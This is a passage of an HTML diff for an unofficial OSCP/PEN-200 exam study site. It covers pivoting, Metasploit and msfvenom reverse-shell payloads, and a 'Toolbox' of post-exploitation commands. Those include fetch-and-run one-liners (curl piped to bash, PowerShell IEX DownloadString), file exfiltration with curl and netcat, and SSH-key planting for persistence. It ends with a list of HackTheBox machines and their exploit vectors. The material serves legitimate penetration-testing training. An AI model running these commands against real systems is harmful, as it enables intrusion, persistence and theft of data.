+<span class="c"># On agent (target):</span>
+./agent -connect <span class="s">$IP</span>:11601 -ignore-cert
+<span class="c"># In ligolo session: start, then</span>  sudo ip route add 10.10.20.0/24 dev ligolo</pre></div>
+      <div class="cheat-sub"># chisel (reverse SOCKS)</div>
+      <div class="code"><pre><span class="c"># Attacker</span>  ./chisel server -p 8000 --reverse
+<span class="c"># Target</span>    ./chisel client <span class="s">$IP</span>:8000 R:socks
+<span class="c"># then</span>  proxychains &lt;cmd&gt;   (socks5 127.0.0.1 1080 in /etc/proxychains4.conf)</pre></div>
+      <div class="cheat-sub"># SSH tunnels &amp; proxychains</div>
+      <div class="code"><pre>ssh -L 8080:127.0.0.1:80 user@host      <span class="c"># local: reach host:80 via localhost:8080</span>
+ssh -R 9001:127.0.0.1:9001 user@attacker  <span class="c"># remote</span>
+ssh -D 1080 user@host                   <span class="c"># dynamic SOCKS proxy</span>
+proxychains -q nmap -sT -Pn 10.10.20.5</pre></div>
+    </div>
+
+    <!-- MSF / BOF -->
+    <div class="cheat-block" id="c-msf">
+      <h3><span class="tag">09</span> Metasploit, msfvenom &amp; Buffer Overflow</h3>
+      <div class="cheat-sub"># msfvenom payloads (always allowed)</div>
+      <div class="code"><pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="s">$IP</span> LPORT=443 -f exe -o s.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<span class="s">$IP</span> LPORT=443 -f elf -o s
+msfvenom -p php/reverse_php LHOST=<span class="s">$IP</span> LPORT=443 -f raw -o s.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="s">$IP</span> LPORT=443 -f war -o s.war</pre></div>
+      <div class="cheat-sub"># multi/handler (unrestricted)</div>
+      <div class="code"><pre>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <span class="s">$IP</span>; set LPORT 443; run"</pre></div>
+      <div class="note"><b>Exam rule:</b> full Metasploit exploit/post modules and Meterpreter may be used on <b>only one</b> standalone machine - never the AD set. Choose wisely, and never depend on it: learn the manual path first.</div>
+      <div class="cheat-sub"># Buffer Overflow (legacy - no longer a dedicated exam topic, still good to know)</div>
+      <div class="code"><pre><span class="c"># Classic stack BOF flow:</span>
+<span class="c"># 1 fuzz → crash   2 pattern_create/offset → find EIP</span>
+<span class="c"># 3 find bad chars  4 !mona jmp esp → JMP address</span>
+<span class="c"># 5 msfvenom shellcode (-b badchars) → 6 profit</span>
+pattern_create.rb -l 2000 ; pattern_offset.rb -q &lt;EIP&gt;</pre></div>
+    </div>
+
+    <div class="callout"><span class="ic">[*]</span><p><strong>This is a starting kit.</strong> The most valuable cheat sheet is the one <em>you</em> grow one box at a time. Every command you look up, paste into your own notes. By the time you sit the exam it becomes your co-pilot.</p></div>
+  </main>
+</div>
+
+<!-- ==================== TOOLBOX ==================== -->
+<div class="page" id="page-toolbox">
+  <div class="subnav"><div class="wrap" id="toolnav">
+    <a data-cheat="t-ssh">SSH &amp; Keys</a>
+    <a data-cheat="t-transfer">File Transfer</a>
+    <a data-cheat="t-serve">Serve &amp; Download</a>
+    <a data-cheat="t-compile">Compiling Exploits</a>
+    <a data-cheat="t-encode">Encoding &amp; Hashing</a>
+    <a data-cheat="t-net">Networking &amp; /etc/hosts</a>
+    <a data-cheat="t-survival">Shell Survival</a>
+    <a data-cheat="t-python">Python &amp; Setup</a>
+  </div></div>
+  <main class="wrap">
+    <div style="padding-top:24px">
+      <div class="kicker">The everyday commands, not the exploits</div>
+      <h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,36px);margin:12px 0 6px">The Handy Toolbox</h2>
+      <p class="lead">The plumbing you use on <em>every</em> box - moving files, logging in, serving payloads, compiling code, fixing your shell. Keep this open in a tab; these are the commands you'll forget under exam pressure.</p>
+    </div>
+
+    <!-- SSH -->
+    <div class="cheat-block" id="t-ssh">
+      <h3><span class="tag">SSH</span> SSH &amp; Key Authentication</h3>
+      <p>You'll get an SSH foothold constantly - often via a found private key. The #1 gotcha: a key with loose permissions is silently rejected.</p>
+      <div class="cheat-sub"># Connect</div>
+      <div class="code"><pre>ssh user@<span class="s">$IP</span>                       <span class="c"># password auth</span>
+ssh user@<span class="s">$IP</span> -p 2222                <span class="c"># non-standard port</span>
+ssh -i id_rsa user@<span class="s">$IP</span>              <span class="c"># private-key auth</span>
+sshpass -p 'Passw0rd!' ssh user@<span class="s">$IP</span>   <span class="c"># scripted / non-interactive</span></pre></div>
+      <div class="cheat-sub"># Using a private key you found (the critical step)</div>
+      <div class="code"><pre>chmod 600 id_rsa            <span class="c"># MUST - or ssh ignores the key</span>
+ssh -i id_rsa user@<span class="s">$IP</span>
+<span class="c"># Key is passphrase-protected? crack it:</span>
+ssh2john id_rsa &gt; hash ; john --wordlist=rockyou.txt hash</pre></div>
+      <div class="cheat-sub"># Generate a keypair &amp; plant it for persistence / access</div>
+      <div class="code"><pre>ssh-keygen -t rsa -b 4096 -f mykey        <span class="c"># makes mykey + mykey.pub</span>
+<span class="c"># On target, if you can write the victim's home:</span>
+echo 'ssh-rsa AAAA...your pubkey...' &gt;&gt; ~/.ssh/authorized_keys
+<span class="c"># then from attacker:</span>  ssh -i mykey user@<span class="s">$IP</span></pre></div>
+      <div class="cheat-sub"># Common fixes / flags</div>
+      <div class="code"><pre>ssh -o StrictHostKeyChecking=no user@<span class="s">$IP</span>          <span class="c"># skip host-key prompt</span>
+ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa user@<span class="s">$IP</span>    <span class="c"># old key type rejected</span>
+ssh user@<span class="s">$IP</span> "id; hostname"                       <span class="c"># run one command &amp; exit</span>
+<span class="c"># Port forwarding recap (full detail on the Cheat Sheet → Pivoting):</span>
+ssh -L 8080:127.0.0.1:80 user@<span class="s">$IP</span>   <span class="c"># -L local  -R remote  -D dynamic SOCKS</span></pre></div>
+    </div>
+
+    <!-- TRANSFER -->
+    <div class="cheat-block" id="t-transfer">
+      <h3><span class="tag">CP</span> File Transfer - scp · ftp · nc · smb</h3>
+      <div class="cheat-sub"># scp (uses SSH; needs SSH access)</div>
+      <div class="code"><pre>scp file.txt user@<span class="s">$IP</span>:/tmp/            <span class="c"># push to target</span>
+scp user@<span class="s">$IP</span>:/etc/passwd ./            <span class="c"># pull from target</span>
+scp -i id_rsa -P 2222 f user@<span class="s">$IP</span>:/tmp/  <span class="c"># with key + port</span>
+scp -r folder user@<span class="s">$IP</span>:/tmp/          <span class="c"># recursive</span></pre></div>
+      <div class="cheat-sub"># FTP (interactive)</div>
+      <div class="code"><pre>ftp <span class="s">$IP</span>            <span class="c"># login: anonymous / any password</span>
+<span class="c"># inside the ftp&gt; prompt:</span>
+binary            <span class="c"># ALWAYS set binary before moving exes/images</span>
+passive           <span class="c"># toggle if transfers hang</span>
+ls ; cd dir ; get secret.txt ; put shell.php ; mget *
+<span class="c"># non-interactive one-liner grab:</span>
+wget ftp://user:pass@<span class="s">$IP</span>/file
+curl -u user:pass ftp://<span class="s">$IP</span>/file -o file</pre></div>
+      <div class="cheat-sub"># netcat transfer (no SSH/FTP available)</div>
+      <div class="code"><pre><span class="c"># Receiver (attacker):</span>  nc -lvnp 4444 &gt; incoming.file
+<span class="c"># Sender (target):</span>     nc <span class="s">$IP</span> 4444 &lt; secret.file
+<span class="c"># Reverse direction works the same - whichever end can connect out</span></pre></div>
+      <div class="cheat-sub"># SMB (great for Windows targets)</div>
+      <div class="code"><pre><span class="c"># Attacker hosts a share:</span>
+impacket-smbserver share $(pwd) -smb2support -user a -pass a
+<span class="c"># Windows target pulls/pushes:</span>
+copy \\<span class="s">$IP</span>\share\nc.exe .
+copy loot.txt \\<span class="s">$IP</span>\share\
+<span class="c"># Linux smbclient:</span>
+smbclient //<span class="s">$IP</span>/share -U user -c 'get file.txt'</pre></div>
+    </div>
+
+    <!-- SERVE -->
+    <div class="cheat-block" id="t-serve">
+      <h3><span class="tag">WEB</span> Serving &amp; Downloading Files</h3>
+      <div class="cheat-sub"># Stand up a quick web server (attacker)</div>
+      <div class="code"><pre>python3 -m http.server 80          <span class="c"># serves current dir on :80</span>
+php -S 0.0.0.0:80                  <span class="c"># if python missing</span>
+<span class="c"># Upload server (receive files via POST):</span>
+python3 -m uploadserver 8000        <span class="c"># pip install uploadserver</span></pre></div>
+      <div class="cheat-sub"># Download onto a Linux target</div>
+      <div class="code"><pre>wget http://<span class="s">$IP</span>/linpeas.sh -O /tmp/l.sh
+curl http://<span class="s">$IP</span>/l.sh -o /tmp/l.sh
+curl http://<span class="s">$IP</span>/l.sh | bash              <span class="c"># run without touching disk</span></pre></div>
+      <div class="cheat-sub"># Download onto a Windows target</div>
+      <div class="code"><pre>certutil -urlcache -f http://<span class="s">$IP</span>/nc.exe nc.exe
+powershell iwr -uri http://<span class="s">$IP</span>/x.exe -o x.exe
+powershell "(New-Object Net.WebClient).DownloadFile('http://<span class="s">$IP</span>/x.exe','x.exe')"
+<span class="c"># Fileless exec in memory:</span>
+powershell "IEX(New-Object Net.WebClient).DownloadString('http://<span class="s">$IP</span>/s.ps1')"</pre></div>
+      <div class="cheat-sub"># Upload FROM a target back to you</div>
+      <div class="code"><pre><span class="c"># target → attacker (attacker runs uploadserver, then):</span>
+curl -F 'files=@/etc/passwd' http://<span class="s">$IP</span>:8000/upload</pre></div>
+    </div>
+
+    <!-- COMPILE -->
+    <div class="cheat-block" id="t-compile">
+      <h3><span class="tag">GCC</span> Compiling Exploits</h3>
+      <p>A downloaded exploit is often C source. Compile it - ideally matching the target's architecture. Prefer compiling on your Kali and transferring the binary.</p>
+      <div class="cheat-sub"># Linux exploits</div>
+      <div class="code"><pre>gcc exploit.c -o exploit            <span class="c"># native 64-bit</span>
+gcc -m32 exploit.c -o exploit32     <span class="c"># 32-bit target (need gcc-multilib)</span>
+gcc -static exploit.c -o exploit    <span class="c"># static - for missing libs on target</span>
+<span class="c"># classic DirtyCow etc often need pthread:</span>
+gcc exploit.c -o exploit -pthread</pre></div>
+      <div class="cheat-sub"># Cross-compile a Windows .exe from Kali</div>
+      <div class="code"><pre>sudo apt install mingw-w64
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe      <span class="c"># 64-bit</span>
+i686-w64-mingw32-gcc  exploit.c -o exploit32.exe     <span class="c"># 32-bit</span></pre></div>
+      <div class="note"><b>Tip:</b> if a public exploit won't compile, read the header comments - many list the exact <code>gcc</code> line and required libraries. Fixing/porting exploits is an official PEN-200 skill and a common exam moment.</div>
+    </div>
+
+    <!-- ENCODE -->
+    <div class="cheat-block" id="t-encode">
+      <h3><span class="tag">B64</span> Encoding, Hashing &amp; Text</h3>
+      <div class="cheat-sub"># base64 - transfer binaries through a text-only shell</div>
+      <div class="code"><pre><span class="c"># attacker: encode</span>   base64 -w0 shell.exe
+<span class="c"># target (linux): decode</span>   echo 'BASE64...' | base64 -d &gt; shell.exe
+<span class="c"># target (windows PS):</span>   certutil -decode in.b64 out.exe</pre></div>
+      <div class="cheat-sub"># Identify &amp; make hashes</div>
+      <div class="code"><pre>hashid '&lt;hash&gt;' ; hash-identifier
+openssl passwd -6 'Password1'          <span class="c"># make a $6$ shadow hash</span>
+openssl passwd -1 -salt xyz 'pass'     <span class="c"># $1$ for /etc/passwd tricks</span>
+echo -n 'admin' | md5sum</pre></div>
+      <div class="cheat-sub"># Inspect files</div>
+      <div class="code"><pre>file suspicious            <span class="c"># what is it?</span>
+strings -n 8 binary        <span class="c"># readable strings (creds!)</span>
+xxd file | head            <span class="c"># hex view (magic bytes)</span>
+exiftool image.jpg         <span class="c"># metadata (usernames, GPS, comments)</span></pre></div>
+    </div>
+
+    <!-- NET -->
+    <div class="cheat-block" id="t-net">
+      <h3><span class="tag">NET</span> Networking &amp; the /etc/hosts Trap</h3>
+      <p>The single most common "why isn't this working" on HTB/PG: the site uses a hostname you haven't mapped. Add it to <code>/etc/hosts</code> before web enumeration.</p>
+      <div class="cheat-sub"># Map the target hostname (do this early!)</div>
+      <div class="code"><pre>sudo sh -c 'echo "<span class="s">$IP</span>  target.htb www.target.htb" &gt;&gt; /etc/hosts'
+<span class="c"># Spot the hostname from: nmap -sCV output, HTTP redirects,</span>
+<span class="c"># TLS certificate CN/SAN, or a 400/redirect to a named vhost</span></pre></div>
+      <div class="cheat-sub"># Your attacker networking</div>
+      <div class="code"><pre>ip a                       <span class="c"># find your VPN IP (tun0) - this is your LHOST</span>
+ip a show tun0
+ping -c1 <span class="s">$IP</span>              <span class="c"># reachable? (some boxes block ICMP - use nmap -Pn)</span></pre></div>
+      <div class="cheat-sub"># On-target network recon (post-shell)</div>
+      <div class="code"><pre>ip a ; ip route ; cat /etc/hosts /etc/resolv.conf
+ss -tulpn                  <span class="c"># listening services (internal-only ports = pivot targets)</span>
+netstat -ano               <span class="c"># Windows equivalent</span>
+arp -a                     <span class="c"># other hosts on the segment</span></pre></div>
+    </div>
+
+    <!-- SURVIVAL -->
+    <div class="cheat-block" id="t-survival">
+      <h3><span class="tag">TTY</span> Shell Survival - tmux · vi · fixing shells</h3>
+      <div class="cheat-sub"># Upgrade a dumb reverse shell to a real TTY</div>
+      <div class="code"><pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="c"># press Ctrl-Z, then on your box:</span>
+stty raw -echo; fg
+<span class="c"># back in the shell:</span>
+export TERM=xterm; stty rows 38 cols 116     <span class="c"># now arrows/Ctrl-C/clear work</span></pre></div>
+      <div class="cheat-sub"># tmux - survive long sessions &amp; dropped VPNs</div>
+      <div class="code"><pre>tmux new -s oscp           <span class="c"># named session</span>
+<span class="c"># Ctrl-b d = detach   ·   Ctrl-b " = split horiz   ·   Ctrl-b % = split vert</span>
+tmux attach -t oscp        <span class="c"># reattach after a disconnect</span>
+tmux ls</pre></div>
+      <div class="cheat-sub"># vi / nano - save &amp; quit without panicking</div>
+      <div class="code"><pre><span class="c"># nano:</span>  Ctrl-O = save,  Ctrl-X = exit
+<span class="c"># vi/vim:</span>  i = insert,  Esc then :wq = save+quit,  :q! = quit no-save</pre></div>
+      <div class="cheat-sub"># Fast searching</div>
+      <div class="code"><pre>grep -rin 'password' /var/www 2&gt;/dev/null
+find / -name '*.conf' -mtime -10 2&gt;/dev/null
+history ; cat ~/.bash_history</pre></div>
+    </div>
+
+    <!-- PYTHON -->
+    <div class="cheat-block" id="t-python">
+      <h3><span class="tag">ENV</span> Python, pip &amp; running found scripts</h3>
+      <div class="cheat-sub"># Run exploit scripts cleanly</div>
+      <div class="code"><pre>python3 exploit.py <span class="s">$IP</span>
+python2 old_exploit.py            <span class="c"># many old PoCs are py2 - keep it installed</span>
+<span class="c"># isolated deps so you don't wreck system python:</span>
+python3 -m venv venv &amp;&amp; source venv/bin/activate &amp;&amp; pip install requests</pre></div>
+      <div class="cheat-sub"># pipx / requirements for tools</div>
+      <div class="code"><pre>pip install -r requirements.txt
+<span class="c"># Fix "externally-managed-environment" on Kali:</span>
+pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a venv (preferred)</span></pre></div>
+      <div class="note"><b>Exam kit reminder:</b> pre-stage your Kali with linpeas/winpeas, chisel, ligolo-ng, PrintSpoofer/GodPotato, nc.exe, SecLists, and impacket - offline. Snapshot the VM before exam day so a broken update can't cost you the exam.</div>
+    </div>
+
+    <div class="callout"><span class="ic">[*]</span><p><strong>Muscle memory beats notes.</strong> These are the commands you'll type on literally every box. Drill the ones you keep looking up (TTY upgrade, /etc/hosts, chmod 600 on keys) until they're automatic - that's where exam-day speed comes from.</p></div>
+  </main>
+</div>
+
+<!-- ==================== PORTS ==================== -->
+<div class="page" id="page-ports">
+  <main class="wrap">
+    <div style="padding-top:24px">
+      <div class="kicker">CTF quick reference // enumerate faster</div>
+      <h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,36px);margin:12px 0 6px">Common Ports</h2>
+      <p class="lead">See a port in your nmap output, jump straight to what it is and how to attack it. Each card has a one-liner, the first commands to run, common attack vectors, and a HackTricks link. Replace <code>$IP</code> with your target.</p>
+    </div>
+    <div class="boxctl">
+      <div class="boxsearch"><input id="portSearch" type="text" placeholder="search port or service... (e.g. 445, smb, redis, kerberos, upload)"></div>
+    </div>
+    <div class="filters" id="portFilters">
+      <button class="filt on" data-f="all">All</button>
+      <button class="filt" data-f="web">Web</button>
+      <button class="filt" data-f="windows">Windows / AD</button>
+      <button class="filt" data-f="db">Databases</button>
+      <button class="filt" data-f="mail">Mail</button>
+      <button class="filt" data-f="remote">Remote Access</button>
+      <button class="filt" data-f="file">File / Share</button>
+      <button class="filt" data-f="other">Other</button>
+    </div>
+    <div class="boxcount" id="portCount"></div>
+    <div class="portgrid" id="portGrid"></div>
+    <div class="callout" style="margin-top:24px"><span class="ic">[i]</span><p>Golden rule: <strong>enumerate every open port before exploiting any</strong>. The foothold is usually hiding in a service people skip. Reference links go to the matching HackTricks pentesting page; if one has moved, search "hacktricks pentesting &lt;service&gt;".</p></div>
+  </main>
+</div>
+
+<!-- ==================== BOXES ==================== -->
+<div class="page" id="page-boxes">
+  <main class="wrap">
+    <div style="padding-top:24px">
+      <div class="kicker">TJnull / NetSecFocus curated · HTB + Proving Grounds only</div>
+      <h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,36px);margin:12px 0 6px">The Box Index</h2>
+      <p class="lead">Click any box to expand its attack vectors and open real reference links. <strong>Proving Grounds Practice is the closest proxy to the real exam</strong> - prioritise the PG boxes. Filter and search below.</p>
+    </div>
+    <div class="boxctl">
+      <div class="boxsearch"><input id="boxSearch" type="text" placeholder="search box name, tech, focus… (e.g. kerberoast, upload, potato)"></div>
+    </div>
+    <div class="filters" id="boxFilters">
+      <button class="filt on" data-f="all" data-g="src">All</button>
+      <button class="filt" data-f="HackTheBox" data-g="src">HackTheBox</button>
+      <button class="filt" data-f="Proving Grounds" data-g="src">Proving Grounds</button>
+      <span style="width:12px"></span>
+      <button class="filt" data-f="Linux" data-g="os">Linux</button>
+      <button class="filt" data-f="Windows" data-g="os">Windows</button>
+      <button class="filt" data-f="AD" data-g="os">Active Directory</button>
+      <span style="width:12px"></span>
+      <button class="filt" data-f="Easy" data-g="diff">Easy</button>
+      <button class="filt" data-f="Medium" data-g="diff">Medium</button>
+      <button class="filt" data-f="Hard" data-g="diff">Hard</button>
+    </div>
+    <div class="boxcount" id="boxCount"></div>
+    <div class="boxgrid" id="boxGrid"></div>
+    <div class="callout" style="margin-top:24px;border-left-color:var(--warn)"><span class="ic" style="color:var(--warn)">[i]</span><p><strong>This is a curated, vetted slice of TJnull's V3 list (PEN-200 2023-2024) - not a live mirror.</strong> The full sheet has 100+ HTB boxes and is continuously updated as HTB retires new machines. What you get here that the raw sheet doesn't have: the actual foothold &amp; privesc vector for each box, plus one-click writeup links. <strong>Use the live sources as your master:</strong> <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview" target="_blank" rel="noopener">NetSecFocus Trophy Room sheet</a> · <a href="https://0xdf.gitlab.io/cheatsheets/offsec" target="_blank" rel="noopener">0xdf's parsed OffSec list</a>.</p></div>
+  </main>
+</div>
+
+<!-- ==================== RESOURCES ==================== -->
+<div class="page" id="page-resources">
+  <main class="wrap">
+    <div style="padding-top:24px">
+      <div class="kicker">Bookmark all of these</div>
+      <h2 style="font-family:var(--serif);font-size:clamp(26px,4vw,36px);margin:12px 0 6px">Resources</h2>
+      <p class="lead">Every external reference worth keeping open in a tab during prep. Links open in a new tab.</p>
+    </div>
+    <div class="res-grid">
+      <div class="rescard"><h3>Official OffSec</h3><ul class="reslist">
+        <li><a href="https://www.offsec.com/courses/pen-200/" target="_blank" rel="noopener">PEN-200 course</a><span class="desc">The syllabus you're being tested on</span></li>
+        <li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" rel="noopener">OSCP Exam Guide</a><span class="desc">Official rules - read before booking</span></li>
+        <li><a href="https://portal.offsec.com/labs/play" target="_blank" rel="noopener">Proving Grounds Practice</a><span class="desc">Closest boxes to the real exam</span></li>
+      </ul></div>
+      <div class="rescard"><h3>Box lists &amp; platforms</h3><ul class="reslist">
+        <li><a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview" target="_blank" rel="noopener">TJnull OSCP List (NetSecFocus)</a><span class="desc">The canonical prep machine list</span></li>
+        <li><a href="https://app.hackthebox.com/" target="_blank" rel="noopener">HackTheBox</a><span class="desc">Retired boxes = breadth</span></li>
+        <li><a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe</a><span class="desc">Guided rooms for fundamentals</span></li>
+      </ul></div>
+      <div class="rescard"><h3>Writeups &amp; video</h3><ul class="reslist">
+        <li><a href="https://www.youtube.com/@ippsec" target="_blank" rel="noopener">IppSec (YouTube)</a><span class="desc">Best HTB walkthroughs anywhere</span></li>
+        <li><a href="https://ippsec.rocks/" target="_blank" rel="noopener">ippsec.rocks</a><span class="desc">Search IppSec videos by technique</span></li>
+        <li><a href="https://0xdf.gitlab.io/" target="_blank" rel="noopener">0xdf writeups</a><span class="desc">Detailed written HTB walkthroughs</span></li>
+      </ul></div>
+      <div class="rescard"><h3>Reference wikis</h3><ul class="reslist">
+        <li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">HackTricks</a><span class="desc">The pentest bible - privesc, AD, web</span></li>
+        <li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a><span class="desc">Linux binary abuse (sudo/SUID)</span></li>
+        <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a><span class="desc">Windows living-off-the-land binaries</span></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a><span class="desc">Payloads for every web bug</span></li>
+      </ul></div>
+      <div class="rescard"><h3>Tools &amp; helpers</h3><ul class="reslist">
+        <li><a href="https://www.revshells.com/" target="_blank" rel="noopener">revshells.com</a><span class="desc">Reverse-shell generator, every language</span></li>
+        <li><a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener">PEASS-ng (linpeas/winpeas)</a><span class="desc">Privesc enumeration scripts</span></li>
+        <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a><span class="desc">AD attack-path mapping</span></li>
+        <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a><span class="desc">psexec, secretsdump, GetUserSPNs…</span></li>
+        <li><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a><span class="desc">Wordlists for everything</span></li>
+      </ul></div>
+      <div class="rescard"><h3>AD &amp; privesc deep-dives</h3><ul class="reslist">
+        <li><a href="https://www.thehacker.recipes/" target="_blank" rel="noopener">The Hacker Recipes</a><span class="desc">Clear AD attack methodology</span></li>
+        <li><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener">GOAD lab</a><span class="desc">Build your own AD practice lab</span></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md" target="_blank" rel="noopener">AD Attack cheat sheet</a><span class="desc">Command reference for the AD set</span></li>
+      </ul></div>
+    </div>
+    <div class="callout" style="margin-top:22px"><span class="ic">[i]</span><p>Links reflect the well-known canonical sources at time of writing; some projects move domains (HackTricks especially). If one 404s, search the project name.</p></div>
+  </main>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-top">
+      <div>
+        <div class="foot-brand">oscp<span class="sq">::</span>hub</div>
+        <p>An unofficial, community-built study companion for the OSCP / PEN-200 exam. Pairs with <a href="OSCP_Machine_Tracker.csv" download>OSCP_Machine_Tracker.csv</a>.</p>
+      </div>
+      <nav class="foot-links" aria-label="Footer navigation">
+        <a data-nav="home">Home</a>
+        <a data-nav="plan">Preparation Plan</a>
+        <a data-nav="cheatsheet">Cheat Sheet</a>
+        <a data-nav="toolbox">Toolbox</a>
+        <a data-nav="ports">Ports</a>
+        <a data-nav="boxes">Box Index</a>
+        <a data-nav="resources">Resources</a>
+      </nav>
+    </div>
+    <p class="foot-disclaimer"><b>Disclaimer:</b> OSCP, PEN-200, and OffSec are trademarks of OffSec Services Limited. This site is not affiliated with, authorised by, or endorsed by OffSec. The point structure, module names, and machine lists are provided for study purposes and may change. Always confirm the current rules on the official OffSec exam guide before you book.</p>
+    <div class="foot-bottom">
+      <span>&copy; 2026 OSCP Resource Hub // built for exam preparation</span>
+      <span>verify current rules at offsec.com/courses/pen-200</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  /* ---------- box data ---------- */
+  var BOXES = [
+    // HTB Linux
+    {n:"Lame",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"SMB",fh:"Samba usermap_script RCE (CVE-2007-2447)",pe:"Exploit runs as root already"},
+    {n:"Beep",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"LFI / Shellshock",fh:"Elastix LFI leaks creds → SSH / web RCE",pe:"sudo (nmap/etc) via GTFOBins"},
+    {n:"Shocker",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Shellshock",fh:"cgi-bin Shellshock (CVE-2014-6271)",pe:"sudo perl"},
+    {n:"Bashed",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Web shell / Cron",fh:"Exposed phpbash web shell",pe:"Cron job running as root as scriptmanager"},
+    {n:"Nibbles",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"CMS upload / Sudo",fh:"Nibbleblog file-upload RCE",pe:"sudo on writable monitor.sh"},
+    {n:"Sense",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"pfSense",fh:"Leaked creds → pfSense RCE (CVE-2014-4688)",pe:"Root via exploit"},
+    {n:"Networked",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Upload / Cron",fh:"PHP upload via crafted image",pe:"Cron + sudo changename injection"},
+    {n:"Valentine",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Heartbleed",fh:"Heartbleed (CVE-2014-0160) leaks key",pe:"Root tmux session / DirtyCow"},
+    {n:"Tabby",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Tomcat / LXD",fh:"Tomcat manager text upload (WAR)",pe:"lxd group container escape"},
+    {n:"Admirer",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Adminer / Python",fh:"Adminer reads local file → DB creds",pe:"sudo PYTHONPATH library hijack"},
+    {n:"OpenAdmin",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"ONA / Sudo",fh:"OpenNetAdmin RCE",pe:"SSH key → sudo nano"},
+    {n:"Doctor",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"SSTI / Splunk",fh:"SSTI in messaging app",pe:"Splunk Universal Forwarder abuse"},
+    {n:"Delivery",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Mattermost / Hashcat",fh:"Helpdesk email trick → Mattermost creds",pe:"Hashcat rule mutation of reused password"},
+    {n:"Knife",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"PHP backdoor / Sudo",fh:"PHP 8.1 dev backdoor header",pe:"sudo knife"},
+    {n:"Cap",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Capabilities",fh:"IDOR → pcap → FTP/SSH creds",pe:"python cap_setuid capability"},
+    {n:"Traverxec",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Nostromo",fh:"Nostromo RCE (CVE-2019-16278)",pe:"Crack nhttpd basic auth → sudo journalctl"},
+    {n:"Blocky",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"WordPress / Jar",fh:"Creds inside a Java .jar → SSH",pe:"sudo"},
+    {n:"Irked",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"IRC / Steghide",fh:"UnrealIRCd backdoor (CVE-2010-2075)",pe:"SUID binary + steghide creds"},
+    {n:"SolidState",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"James / rbash",fh:"Apache James exploit",pe:"Cron + rbash escape"},
+    {n:"Poison",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"LFI / VNC",fh:"LFI log poisoning → RCE",pe:"VNC password reuse"},
+    {n:"Magic",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"Upload / MySQL",fh:"Image upload with embedded PHP",pe:"SUID sysinfo → MySQL creds"},
+    {n:"Passage",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"CuteNews",fh:"CuteNews RCE",pe:"Crack hash → USBCreator D-Bus abuse"},
+    {n:"Pit",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"SNMP / SeedDMS",fh:"SNMP enum → SeedDMS RCE",pe:"Monitoring script / gitea"},
+    {n:"Mango",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"NoSQL Injection",fh:"NoSQL auth-bypass injection",pe:"SUID jjs"},
+    // HTB Windows
+    {n:"Legacy",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"SMB",fh:"MS08-067 SMB RCE",pe:"Exploit yields SYSTEM"},
+    {n:"Blue",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"SMB",fh:"EternalBlue MS17-010",pe:"Exploit yields SYSTEM"},
+    {n:"Devel",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"FTP / Kernel",fh:"Anon FTP → upload aspx web shell",pe:"MS11-046 / churrasco kernel"},
+    {n:"Optimum",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"HFS",fh:"HFS RCE (CVE-2014-6287)",pe:"MS16-032 / MS16-098"},
+    {n:"Granny",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"WebDAV",fh:"IIS WebDAV upload",pe:"churrasco / MS14-058"},
